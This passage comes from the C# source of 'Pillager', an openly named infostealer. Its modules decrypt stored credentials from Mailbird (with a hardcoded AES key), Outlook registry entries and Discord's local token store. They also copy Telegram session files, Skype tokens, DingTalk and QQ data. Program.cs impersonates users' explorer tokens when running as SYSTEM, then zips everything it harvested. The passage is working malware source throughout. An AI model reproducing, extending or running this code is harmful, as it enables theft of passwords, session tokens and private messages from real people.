        public static byte[] key = { 0X35, 0XE0, 0X85, 0X30, 0X8A, 0X6D, 0X91, 0XA3, 0X96, 0X5F, 0XF2, 0X37, 0X95, 0XD1, 0XCF, 0X36, 0X71, 0XDE, 0X7E, 0X5B, 0X62, 0X38, 0XD5, 0XFB, 0XDB, 0X64, 0XA6, 0X4B, 0XD3, 0X5A, 0X05, 0X53 };
        public static byte[] iv = { 0X98, 0X0F, 0X68, 0XCE, 0X77, 0X43, 0X4C, 0X47, 0XF9, 0XE9, 0X0E, 0X82, 0XF4, 0X6B, 0X4C, 0XE8 };

        public static string GetInfo()
        {
            StringBuilder sb = new StringBuilder();
            try
            {
                string dbpath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Mailbird\\Store\\Store.db");
                if (!File.Exists(dbpath)) return sb.ToString();
                string tempdbPath = Path.GetTempFileName();
                File.Copy(dbpath, tempdbPath, true);
                SQLiteHandler handler = new SQLiteHandler(tempdbPath);
                if (handler.ReadTable("Accounts"))
                {
                    for (int i = 0; i < handler.GetRowCount(); i++)
                    {
                        try
                        {
                            string server = handler.GetValue(i, "Server_Host");
                            string username = handler.GetValue(i, "Username");
                            string password = handler.GetValue(i, "EncryptedPassword");
                            password = AESDecrypt(Convert.FromBase64String(password), key, iv);
                            sb.AppendLine("Server_Host:" + server);
                            sb.AppendLine("Username:" + username);
                            sb.AppendLine("Password:" + password);
                            sb.AppendLine();
                        }
                        catch { }
                    }
                }
                handler = new SQLiteHandler(tempdbPath);
                if (handler.ReadTable("OAuth2Credentials")) 
                {
                    try
                    {
                        for (int i = 0; i < handler.GetRowCount(); i++)
                        {
                            string username = handler.GetValue(i, "AuthorizedAccountId");
                            string password = handler.GetValue(i, "AccessToken");
                            sb.AppendLine("AuthorizedAccountId:" + username);
                            sb.AppendLine("AccessToken:" + password);
                            sb.AppendLine();
                        }
                    }
                    catch { }
                }
                File.Delete(tempdbPath);
                return sb.ToString();
            }
            catch { return sb.ToString(); }
        }

        private static string AESDecrypt(byte[] encryptedBytes, byte[] bKey, byte[] iv)
        {
            MemoryStream mStream = new MemoryStream(encryptedBytes);
            RijndaelManaged aes = new RijndaelManaged();
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            aes.Key = bKey;
            aes.IV = iv;
            CryptoStream cryptoStream = new CryptoStream(mStream, aes.CreateDecryptor(), CryptoStreamMode.Read);
            try
            {
                byte[] tmp = new byte[encryptedBytes.Length + 32];
                int len = cryptoStream.Read(tmp, 0, encryptedBytes.Length + 32);
                byte[] ret = new byte[len];
                Array.Copy(tmp, 0, ret, 0, len);
                return Encoding.UTF8.GetString(ret);
            }
            finally
            {
                cryptoStream.Close();
                mStream.Close();
                aes.Clear();
            }
        }

        public static void Save(string path)
        {
            try
            {
                string result = GetInfo();
                if (string.IsNullOrEmpty(result)) return;
                string savepath = Path.Combine(path, MailName);
                Directory.CreateDirectory(savepath);
                File.WriteAllText(Path.Combine(savepath, MailName + ".txt"), result);
            }
            catch { }
        }
    }
}

```

`Pillager/Mails/MailMaster.cs`:

```cs
using Pillager.Helper;
using System;
using System.Collections.Generic;
using System.IO;

namespace Pillager.Mails
{
    internal class MailMaster
    {
        public static string MailName = "MailMaster";

        private static List<string> GetDataPath()
        {
            List<string> strings = new List<string>();
            string sqlpath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Netease\\MailMaster\\data\\app.db");
            if (!File.Exists(sqlpath)) return strings;
            string db_tempFile = Path.GetTempFileName();
            try
            {
                File.Copy(sqlpath, db_tempFile, true);
                SQLiteHandler handler = new SQLiteHandler(db_tempFile);
                if (!handler.ReadTable("Account")) return strings;
                for (int i = 0; i < handler.GetRowCount(); i++)
                {
                    string path = handler.GetValue(i, "DataPath");
                    strings.Add(path);
                }
            }
            catch { }
            File.Delete(db_tempFile);
            return strings;
        }

        public static List<int> FindBytes(byte[] src, byte[] find)
        {
            List<int> offsets = new List<int>();
            if (src == null || find == null || src.Length == 0 || find.Length == 0 || find.Length > src.Length) return offsets;
            for (int i = 0; i < src.Length - find.Length + 1; i++)
            {
                if (src[i] == find[0])
                {
                    for (int m = 1; m < find.Length; m++)
                    {
                        if (src[i + m] != find[m]) break;
                        if (m == find.Length - 1) offsets.Add(i);
                    }
                }
            }
            return offsets;
        }

        public static void Save(string path)
        {
            try
            {
                string sqlpath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Netease\\MailMaster\\data");
                if (!Directory.Exists(sqlpath)) return;
                List<string> datapath = GetDataPath();
                string savepath = Path.Combine(path, MailName);
                Directory.CreateDirectory(savepath);
                foreach (var directory in datapath)
                {
                    Methods.CopyDirectory(directory, Path.Combine(savepath, Path.GetFileName(directory)), true);
                }
            }
            catch { }
        }
    }
}

```

`Pillager/Mails/Outlook.cs`:

```cs
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.Win32;

namespace Pillager.Mails
{
    internal class Outlook
    {
        public static string MailName = "Outlook";

        private static Regex mailClient = new Regex(@"^([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})$");
        private static Regex smptClient = new Regex(@"^(?!:\/\/)([a-zA-Z0-9-_]+\.)*[a-zA-Z0-9][a-zA-Z0-9-_]+\.[a-zA-Z]{2,11}?$");

        public static string GrabOutlook()
        {
            StringBuilder data = new StringBuilder();

            string[] RegDirecories = {
                "Software\\Microsoft\\Office\\15.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
                "Software\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
                "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676",
                "Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\\9375CFF0413111d3B88A00104B2A6676"
            };

            string[] mailClients = {
                "SMTP Email Address","SMTP Server","POP3 Server",
                "POP3 User Name","SMTP User Name","NNTP Email Address",
                "NNTP User Name","NNTP Server","IMAP Server","IMAP User Name",
                "Email","HTTP User","HTTP Server URL","POP3 User",
                "IMAP User", "HTTPMail User Name","HTTPMail Server",
                "SMTP User","POP3 Password2","IMAP Password2",
                "NNTP Password2","HTTPMail Password2","SMTP Password2",
                "POP3 Password","IMAP Password","NNTP Password",
                "HTTPMail Password","SMTP Password"
            };

            foreach (string dir in RegDirecories)
                data.Append(Get(dir, mailClients));

            return data.ToString();
        }

        private static string Get(string path, string[] clients)
        {
            StringBuilder data = new StringBuilder();
            try
            {
                foreach (string client in clients)
                    try
                    {
                        object value = GetInfoFromRegistry(path, client);
                        if (value == null) continue;
                        if (client.Contains("Password") && !client.Contains("2"))
                            data.AppendLine($"{client}: {DecryptValue((byte[])value)}");
                        else
                            if (smptClient.IsMatch(value.ToString()) || mailClient.IsMatch(value.ToString()))
                            data.AppendLine($"{client}: {value}");
                        else
                            data.AppendLine($"{client}: {Encoding.UTF8.GetString((byte[])value).Replace(Convert.ToChar(0).ToString(), "")}");
                    }
                    catch { }

                RegistryKey key = Registry.CurrentUser.OpenSubKey(path, false);
                if (key != null) 
                {
                    string[] Clients = key.GetSubKeyNames();

                    foreach (string client in Clients)
                        data.Append($"{Get($"{path}\\{client}", clients)}");
                }
            }
            catch { }
            return data.ToString();
        }

        private static object GetInfoFromRegistry(string path, string valueName)
        {
            object value = null;
            try
            {
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(path, false);
                if (registryKey == null) return null;
                value = registryKey.GetValue(valueName);
                registryKey.Close();
            }
            catch { }
            return value;
        }

        private static string DecryptValue(byte[] encrypted)
        {
            try
            {
                byte[] decoded = new byte[encrypted.Length - 1];
                Buffer.BlockCopy(encrypted, 1, decoded, 0, encrypted.Length - 1);
                return Encoding.UTF8.GetString(
                    ProtectedData.Unprotect(
                        decoded, null, DataProtectionScope.CurrentUser))
                    .Replace(Convert.ToChar(0).ToString(), "");
            }
            catch { }
            return "null";
        }

        public static void Save(string path)
        {
            try
            {
                string result = GrabOutlook();
                if (string.IsNullOrEmpty(result)) return;
                string savepath = Path.Combine(path, MailName);
                Directory.CreateDirectory(savepath);
                File.WriteAllText(Path.Combine(savepath, "result.txt"), result);
            }
            catch { }
        }
    }
}

```

`Pillager/Messengers/DingTalk.cs`:

```cs
using System;
using System.IO;

namespace Pillager.Messengers
{
    internal class DingTalk
    {
        public static string MessengerName = "DingTalk";

        public static void Save(string path)
        {
            try
            {
                string storagepath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DingTalk\\globalStorage\\storage.db");
                if (!File.Exists(storagepath)) return;
                string storageshmpath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DingTalk\\globalStorage\\storage.db-shm");
                string storagewalpath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DingTalk\\globalStorage\\storage.db-wal");
                string savepath = Path.Combine(path, MessengerName);
                Directory.CreateDirectory(savepath);
                File.Copy(storagepath, Path.Combine(savepath, "storage.db"));
                if (File.Exists(storageshmpath))
                    File.Copy(storageshmpath, Path.Combine(savepath, "storage.db-shm"));
                if (File.Exists(storagewalpath))
                    File.Copy(storagewalpath, Path.Combine(savepath, "storage.db-wal"));
            }
            catch { }
        }
    }
}

```

`Pillager/Messengers/Discord.cs`:

```cs
using Pillager.Helper;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;

namespace Pillager.Messengers
{
    internal class Discord
    {
        public static string MessengerName = "Discord";

        public static Dictionary<string, string> DiscordPaths = new Dictionary<string, string>
        {
            { "Discord", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),"Discord" )} ,
            { "Discord PTB",Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DiscordPTB" )},
            { "Discord Canary", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),"DiscordCanary" )} ,
        };

        public static byte[] GetMasterKey(string path)
        {
            string filePath = Path.Combine(path, "Local State");
            byte[] masterKey = new byte[] { };
            if (!File.Exists(filePath))
                return null;
            var pattern = new Regex("\"encrypted_key\":\"(.*?)\"", System.Text.RegularExpressions.RegexOptions.Compiled).Matches(File.ReadAllText(filePath).Replace(" ", ""));
            foreach (System.Text.RegularExpressions.Match prof in pattern)
            {
                if (prof.Success)
                    masterKey = Convert.FromBase64String((prof.Groups[1].Value));
            }
            byte[] temp = new byte[masterKey.Length - 5];
            Array.Copy(masterKey, 5, temp, 0, masterKey.Length - 5);
            try
            {
                return ProtectedData.Unprotect(temp, null, DataProtectionScope.CurrentUser);
            }
            catch
            {
                return null;
            }
        }

        public static string GetToken(string path, byte[] key)
        {
            StringBuilder stringBuilder = new StringBuilder();
            string leveldbpath = Path.Combine(path, "Local Storage\\leveldb");
            foreach (string filepath in Directory.GetFiles(leveldbpath, "*.l??"))
            { 
                try
                {
                    string content = File.ReadAllText(filepath);
                    if (key != null)
                    {
                        foreach (object obj in Regex.Matches(content, "dQw4w9WgXcQ:([^.*\\['(.*)'\\].*$][^\"]*)"))
                        {
                            Match match2 = (Match)obj;
                            byte[] buffer = Convert.FromBase64String(match2.Groups[1].Value);
                            byte[] cipherText = buffer.Skip(15).ToArray();
                            byte[] iv = buffer.Skip(3).Take(12).ToArray();
                            byte[] tag = cipherText.Skip(cipherText.Length - 16).ToArray();
                            cipherText = cipherText.Take(cipherText.Length - tag.Length).ToArray();
                            byte[] token = new AesGcm().Decrypt(key, iv, null, cipherText, tag);
                            string decrypted_token = Encoding.UTF8.GetString(token);
                            stringBuilder.AppendLine(decrypted_token);
                        }
                    }
                }
                catch {}
            }
            return stringBuilder.ToString();
        }

        public static void Save(string path)
        {
            foreach (var item in DiscordPaths)
            {
                try
                {
                    byte[] key = GetMasterKey(item.Value);
                    if (key == null) continue;
                    string result = GetToken(item.Value, key);
                    if (string.IsNullOrEmpty(result)) continue;
                    string savepath = Path.Combine(path, item.Key);
                    Directory.CreateDirectory(savepath);
                    File.WriteAllText(Path.Combine(savepath, "token.txt"), result);
                }
                catch { }
            }
        }
    }
}

```

`Pillager/Messengers/Enigma.cs`:

```cs
using System;
using System.IO;
using Microsoft.Win32;
using Pillager.Helper;

namespace Pillager.Messengers
{
    internal class Enigma
    {
        public static string MessengerName = "Enigma";

        public static string MessengerPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Enigma\\Enigma");

        public static void Save(string path)
        {
            try
            {
                if (!Directory.Exists(MessengerPath)) return;
                string savepath = Path.Combine(path, MessengerName);
                Directory.CreateDirectory(savepath);
                foreach (var temppath in Directory.GetDirectories(MessengerPath))
                {
                    if (temppath.Contains("audio") || temppath.Contains("log") || temppath.Contains("sticker") || temppath.Contains("emoji"))
                        continue;
                    string dirname = new DirectoryInfo(temppath).Name;
                    Methods.CopyDirectory(temppath,Path.Combine(savepath, dirname),true);
                }
                RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Enigma\\Enigma");
                string deviceid = (string)key.GetValue("device_id");
                File.WriteAllText(Path.Combine(savepath, "device_id.txt"), deviceid);
            }
            catch { }
        }
    }
}

```

`Pillager/Messengers/Line.cs`:

```cs
using System;
using System.IO;

namespace Pillager.Messengers
{
    internal class Line
    {
        public static string MessengerName = "Line";

        public static void Save(string path)
        {
            try
            {
                string inipath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Data/Line.ini");
                if (!File.Exists(inipath)) return;
                string savepath = Path.Combine(path, MessengerName);
                Directory.CreateDirectory(savepath);
                File.Copy(inipath, Path.Combine(savepath, "Line.ini"));
                string info = "Computer Name = " + Environment.MachineName + Environment.NewLine + "User Name = " + Environment.UserName;
                File.WriteAllText(Path.Combine(savepath, "infp.txt"), info);
            }
            catch { }
        }
    }
}

```

`Pillager/Messengers/QQ.cs`:

```cs
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using Pillager.Helper;

namespace Pillager.Messengers
{
    internal class QQ
    {
        public static string MessengerName = "QQ";



        public static string GetCommonDocumentsFolder()
        {
            int SIDL_COMMON_DOCUMENTS = 0x002e;
            StringBuilder sb = new StringBuilder();
            Native.SHGetFolderPath(IntPtr.Zero, SIDL_COMMON_DOCUMENTS, IntPtr.Zero, 0x0000, sb);
            return sb.ToString();
        }

        public static string get_qq()
        {
            List<string> all = new List<string>();
            List<string> online = new List<string>();
            string inifile = Path.Combine(GetCommonDocumentsFolder(), "Tencent\\QQ\\UserDataInfo.ini");
            if (File.Exists(inifile))
            {
                try
                {
                    Pixini pixini = Pixini.Load(inifile);
                    pixini.Save(inifile);
                    string type = pixini.Get("UserDataSavePathType", "UserDataSet", "1");
                    string folder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "Tencent Files");
                    if (type == "2")
                    {
                        folder = pixini.Get("UserDataSavePath", "UserDataSet", "");
                    }
                    foreach (string s in Directory.GetDirectories(folder))
                    {
                        string name = Path.GetFileName(s);
                        if (!name.Contains("All Users")) all.Add(name);
                    }
                }
                catch { }
            }
            foreach (var qq in Directory.GetFiles(@"\\.\Pipe\"))
            {
                if (qq.Contains(@"\\.\Pipe\QQ_") && qq.Contains("_pipe")) online.Add(qq.Replace(@"\\.\Pipe\QQ_", "").Replace("_pipe", ""));
            }
            StringBuilder sb = new StringBuilder();
            if (all.Count > 0)
            {
                sb.AppendLine("All QQ number:");
                sb.AppendLine(string.Join(" ", all.ToArray()));
            }
            if (online.Count > 0)
            {
                sb.AppendLine("Online QQ number:");
                sb.AppendLine(string.Join(" ", online.ToArray()));
            }
            return sb.ToString();
        }

        public static void Save(string path)
        {
            try
            {
                string result = get_qq();
                if (string.IsNullOrEmpty(result)) return;
                string savepath = Path.Combine(path, MessengerName);
                Directory.CreateDirectory(savepath);
                File.WriteAllText(Path.Combine(savepath, "QQ.txt"), result);
            }
            catch { }
        }
    }
}

```

`Pillager/Messengers/Skype.cs`:

```cs
using Pillager.Helper;
using System;
using System.IO;
using System.Text;

namespace Pillager.Messengers
{
    internal class Skype
    {
        public static string MessengerName = "Skype";

        public static string[] MessengerPaths = new string[]
        {
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Microsoft\\Skype for Desktop"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Packages\\Microsoft.SkypeApp_kzf8qxf38zg5c\\LocalCache\\Roaming\\Microsoft\\Skype for Store")
        };

        public static string Skype_cookies(string MessengerPath)
        {
            StringBuilder cookies = new StringBuilder();
            string skype_cookies_path = Path.Combine(MessengerPath, "Network\\Cookies");
            if (!File.Exists(skype_cookies_path)) return null;
            try
            {
                string cookie_tempFile = Path.GetTempFileName();
                try
                {
                    File.Copy(skype_cookies_path, cookie_tempFile, true);
                }
                catch
                {
                    byte[] ckfile = LockedFile.ReadLockedFile(skype_cookies_path);
                    if (ckfile != null) File.WriteAllBytes(cookie_tempFile, ckfile);
                }
                SQLiteHandler handler = new SQLiteHandler(cookie_tempFile);
                if (!handler.ReadTable("cookies")) return null;
                for (int i = 0; i < handler.GetRowCount(); i++)
                {
                    string host_key = handler.GetValue(i, "host_key");
                    string name = handler.GetValue(i, "name");
                    string crypt = handler.GetValue(i, "value");
                    if (handler.GetValue(i, "name") == "skypetoken_asm")
                        cookies.AppendLine("{skypetoken}={" + handler.GetValue(i, "value") + "}");
                }
                File.Delete(cookie_tempFile);
            }
            catch { }
            return cookies.ToString();
        }

        public static void Save(string path)
        {
            try
            {
                if (!Directory.Exists(MessengerPaths[0]) && !Directory.Exists(MessengerPaths[1])) return;
                string Desktop = Skype_cookies(MessengerPaths[0]);
                string Store = Skype_cookies(MessengerPaths[1]);
                if (string.IsNullOrEmpty(Desktop) && string.IsNullOrEmpty(Store)) return;
                string savepath = Path.Combine(path, MessengerName);
                Directory.CreateDirectory(savepath);
                if (!String.IsNullOrEmpty(Desktop)) File.WriteAllText(Path.Combine(savepath, MessengerName + "_Desktop.txt"), Desktop);
                if (!String.IsNullOrEmpty(Store)) File.WriteAllText(Path.Combine(savepath, MessengerName + "_Store.txt"), Store);
            }
            catch { }
        }
    }
}

```

`Pillager/Messengers/Telegram.cs`:

```cs
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;

namespace Pillager.Messengers
{
    internal class Telegram
    {
        public static string MessengerName = "Telegram";

        public static string MessengerPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Telegram Desktop");

        private static string[] sessionpaths =
            {
                "tdata\\key_datas",
                "tdata\\D877F783D5D3EF8Cs",
                "tdata\\D877F783D5D3EF8C\\configs",
                "tdata\\D877F783D5D3EF8C\\maps",
                "tdata\\A7FDF864FBC10B77s",
                "tdata\\A7FDF864FBC10B77\\configs",
                "tdata\\A7FDF864FBC10B77\\maps",
                "tdata\\F8806DD0C461824Fs",
                "tdata\\F8806DD0C461824F\\configs",
                "tdata\\F8806DD0C461824F\\maps",
                "tdata\\C2B05980D9127787s",
                "tdata\\C2B05980D9127787\\configs",
                "tdata\\C2B05980D9127787\\maps",
                "tdata\\0CA814316818D8F6s",
                "tdata\\0CA814316818D8F6\\configs",
                "tdata\\0CA814316818D8F6\\maps",
            };

        public static void Save(string path)
        {
            try
            {
                Process[] tgProcesses = Process.GetProcessesByName("Telegram");
                if (!Directory.Exists(MessengerPath) && tgProcesses.Length == 0) return;
                List<string> tgpaths = new List<string>();
                if (tgProcesses.Length > 0)
                {
                    foreach (var tgProcess in tgProcesses)
                    {
                        tgpaths.Add(Path.GetDirectoryName(tgProcess.MainModule.FileName));
                    }
                }
                if (!tgpaths.Contains(MessengerPath))
                    tgpaths.Add(MessengerPath);
                for (int i = 0; i < tgpaths.Count; i++)
                {
                    string savepath = Path.Combine(path, MessengerName);
                    Directory.CreateDirectory(savepath);

                    Directory.CreateDirectory(Path.Combine(savepath, "tdata_" + i));
                    Directory.CreateDirectory(savepath + "\\tdata_" + i + "\\D877F783D5D3EF8C");
                    Directory.CreateDirectory(savepath + "\\tdata_" + i + "\\A7FDF864FBC10B77");
                    Directory.CreateDirectory(savepath + "\\tdata_" + i + "\\F8806DD0C461824F");
                    Directory.CreateDirectory(savepath + "\\tdata_" + i + "\\C2B05980D9127787");
                    Directory.CreateDirectory(savepath + "\\tdata_" + i + "\\0CA814316818D8F6");
                    foreach (var sessionpath in sessionpaths)
                    {
                        if (File.Exists(Path.Combine(tgpaths[i], sessionpath)))
                        {
                            File.Copy(Path.Combine(tgpaths[i], sessionpath), Path.Combine(savepath, sessionpath.Replace("tdata", "tdata_" + i)), true);
                        }
                    }
                }
            }
            catch { }
        }
    }
}

```

`Pillager/Pillager.csproj`:

```csproj
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
  <PropertyGroup>
    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
    <ProjectGuid>{2DFB5BEA-C5B3-4639-8D37-B6149D665ECA}</ProjectGuid>
    <OutputType>Exe</OutputType>
    <RootNamespace>Pillager</RootNamespace>
    <AssemblyName>Pillager</AssemblyName>
    <TargetFrameworkVersion>v3.5</TargetFrameworkVersion>
    <FileAlignment>512</FileAlignment>
    <Deterministic>true</Deterministic>
    <TargetFrameworkProfile />
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
    <PlatformTarget>AnyCPU</PlatformTarget>
    <DebugSymbols>true</DebugSymbols>
    <DebugType>full</DebugType>
    <Optimize>false</Optimize>
    <OutputPath>bin\Debug\</OutputPath>
    <DefineConstants>TRACE;DEBUG</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
  </PropertyGroup>
  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
    <PlatformTarget>AnyCPU</PlatformTarget>
    <DebugType>pdbonly</DebugType>
    <Optimize>true</Optimize>
    <OutputPath>bin\Release\</OutputPath>
    <DefineConstants>TRACE</DefineConstants>
    <ErrorReport>prompt</ErrorReport>
    <WarningLevel>4</WarningLevel>
  </PropertyGroup>
  <ItemGroup>
    <Reference Include="System" />
    <Reference Include="System.Drawing" />
    <Reference Include="System.Management" />
    <Reference Include="System.Security" />
    <Reference Include="System.Data" />
    <Reference Include="System.Windows.Forms" />
    <Reference Include="System.Xml" />
    <Reference Include="WindowsBase" />
  </ItemGroup>
  <ItemGroup>
    <Compile Include="Browsers\FireFox.cs" />
    <Compile Include="Browsers\IE.cs" />
    <Compile Include="Browsers\OldSogou.cs" />
    <Compile Include="FTPs\CoreFTP.cs" />
    <Compile Include="FTPs\FileZilla.cs" />
    <Compile Include="FTPs\Snowflake.cs" />
    <Compile Include="FTPs\WinSCP.cs" />
    <Compile Include="Helper\AesGcm.cs" />
    <Compile Include="Helper\Asn1Der.cs" />
    <Compile Include="Browsers\Chrome.cs" />
    <Compile Include="Helper\Bcrypt.cs" />
    <Compile Include="Helper\Blowfish.cs" />
    <Compile Include="Helper\decryptMoz3DES.cs" />
    <Compile Include="Helper\Navicat11Cipher.cs" />
    <Compile Include="Helper\Pixini.cs" />
    <Compile Include="Helper\LockedFile.cs" />
    <Compile Include="Helper\Methods.cs" />
    <Compile Include="Helper\models.cs" />
    <Compile Include="Helper\MozillaPBE.cs" />
    <Compile Include="Helper\Native.cs" />
    <Compile Include="Helper\Pbkdf2.cs" />
    <Compile Include="Helper\RC4Crypt.cs" />
    <Compile Include="Helper\TripleDESHelper.cs" />
    <Compile Include="Helper\ZipStorer.cs" />
    <Compile Include="Mails\Foxmail.cs" />
    <Compile Include="Mails\MailBird.cs" />
    <Compile Include="Mails\MailMaster.cs" />
    <Compile Include="Mails\Outlook.cs" />
    <Compile Include="Messengers\DingTalk.cs" />
    <Compile Include="Messengers\Discord.cs" />
    <Compile Include="Messengers\Enigma.cs" />
    <Compile Include="Messengers\Line.cs" />
    <Compile Include="Messengers\QQ.cs" />
    <Compile Include="Messengers\Skype.cs" />
    <Compile Include="Messengers\Telegram.cs" />
    <Compile Include="SystemInfos\InstalledApp.cs" />
    <Compile Include="SystemInfos\ScreenShot.cs" />
    <Compile Include="SystemInfos\Wifi.cs" />
    <Compile Include="Program.cs" />
    <Compile Include="Properties\AssemblyInfo.cs" />
    <Compile Include="Helper\SQLiteHandler.cs" />
    <Compile Include="Softwares\NeteaseCloudMusic.cs" />
    <Compile Include="Tools\DBeaver.cs" />
    <Compile Include="Tools\FinalShell.cs" />
    <Compile Include="Tools\MobaXterm.cs" />
    <Compile Include="Tools\Navicat.cs" />
    <Compile Include="Tools\RDCMan.cs" />
    <Compile Include="Tools\SecureCRT.cs" />
    <Compile Include="Tools\SQLyog.cs" />
    <Compile Include="Softwares\VSCode.cs" />
    <Compile Include="Tools\TortoiseSVN.cs" />
    <Compile Include="Tools\Xmanager.cs" />
  </ItemGroup>
  <ItemGroup>
    <None Include="app.config" />
  </ItemGroup>
  <ItemGroup />
  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
</Project>
```

`Pillager/Program.cs`:

```cs
using System;
using System.Diagnostics;
using System.IO;
using Pillager.Browsers;
using Pillager.FTPs;
using Pillager.Helper;
using Pillager.Mails;
using Pillager.Messengers;
using Pillager.Softwares;
using Pillager.SystemInfos;
using Pillager.Tools;

namespace Pillager
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string savepath = Path.Combine(Path.GetTempPath(), "Pillager");
            string savezippath = savepath + ".zip";
            if (Directory.Exists(savepath)) Directory.Delete(savepath, true);
            if (File.Exists(savezippath)) File.Delete(savezippath);
            Directory.CreateDirectory(savepath);

            if (Environment.UserName.ToLower() == "system")
            {
                foreach (Process p in Process.GetProcesses())
                {
                    if (p.ProcessName.ToLower() == "explorer" && Methods.ImpersonateProcessToken(p.Id))
                    {
                        string usersavepath = Path.Combine(savepath, Methods.GetProcessUserName(p.Id));
                        Directory.CreateDirectory(usersavepath);
                        SaveAll(usersavepath);
                        Native.RevertToSelf();
                    }
                }
            }
            else
            {
                SaveAll(savepath);
            }

            //Zip
            ZipStorer zip = ZipStorer.Create(savezippath);
            foreach (var item in Directory.GetDirectories(savepath))
                zip.AddDirectory(ZipStorer.Compression.Deflate, item, "");
            foreach (var item in Directory.GetFiles(savepath))
                zip.AddFile(ZipStorer.Compression.Deflate, item, Path.GetFileName(item));
            zip.Close();

            Directory.Delete(savepath, true);
        }

        static void SaveAll(string savepath)
        {
            //Browsers
            IE.Save(savepath);
            OldSogou.Save(savepath);//SogouExplorer < 12.x
            Chrome.Save(savepath);
            FireFox.Save(savepath);

            //FTP
            WinSCP.Save(savepath);
            FileZilla.Save(savepath);
            CoreFTP.Save(savepath);
            Snowflake.Save(savepath);

            //Tools
            MobaXterm.Save(savepath);
            Xmanager.Save(savepath);
            Navicat.Save(savepath);
            RDCMan.Save(savepath);
            FinalShell.Save(savepath);
            SQLyog.Save(savepath);
            DBeaver.Save(savepath);
            TortoiseSVN.Save(savepath);
            SecureCRT.Save(savepath);

            //Softwares
            VSCode.Save(savepath);
            NeteaseCloudMusic.Save(savepath);

            //Mail
            MailMaster.Save(savepath);
            Foxmail.Save(savepath);
            Outlook.Save(savepath);
            MailBird.Save(savepath);

            //Messengers
            QQ.Save(savepath);
            Telegram.Save(savepath);
            Skype.Save(savepath);
            Enigma.Save(savepath);
            DingTalk.Save(savepath);
            Line.Save(savepath);
            Discord.Save(savepath);

            //SystemInfos
            Wifi.Save(savepath);
            ScreenShot.Save(savepath);
            InstalledApp.Save(savepath);
        }
    }
}

```

`Pillager/Properties/AssemblyInfo.cs`:

```cs
using System.Reflection;
using System.Runtime.InteropServices;

// 有关程序集的一般信息由以下
// 控制。更改这些特性值可修改
// 与程序集关联的信息。
[assembly: AssemblyTitle("Pillager")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("")]
[assembly: AssemblyProduct("Pillager")]
[assembly: AssemblyCopyright("Copyright ©  2023")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]

// 将 ComVisible 设置为 false 会使此程序集中的类型
//对 COM 组件不可见。如果需要从 COM 访问此程序集中的类型
//请将此类型的 ComVisible 特性设置为 true。
[assembly: ComVisible(false)]

// 如果此项目向 COM 公开，则下列 GUID 用于类型库的 ID
[assembly: Guid("2dfb5bea-c5b3-4639-8d37-b6149d665eca")]

// 程序集的版本信息由下列四个值组成: 
//
//      主版本
//      次版本
//      生成号
//      修订号
//
//可以指定所有这些值，也可以使用“生成号”和“修订号”的默认值
//通过使用 "*"，如下所示:
// [assembly: AssemblyVersion("1.0.*")]
[assembly: AssemblyVersion("1.0.0.0")]
[assembly: AssemblyFileVersion("1.0.0.0")]

```

`Pillager/Softwares/NeteaseCloudMusic.cs`:

```cs
using System;
using System.IO;

namespace Pillager.Softwares
{
    internal class NeteaseCloudMusic
    {
        public static string SoftwareName = "NeteaseCloudMusic";

        public static void Save(string path)
        {
            try
            {
                string infopath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Netease\\CloudMusic\\info");
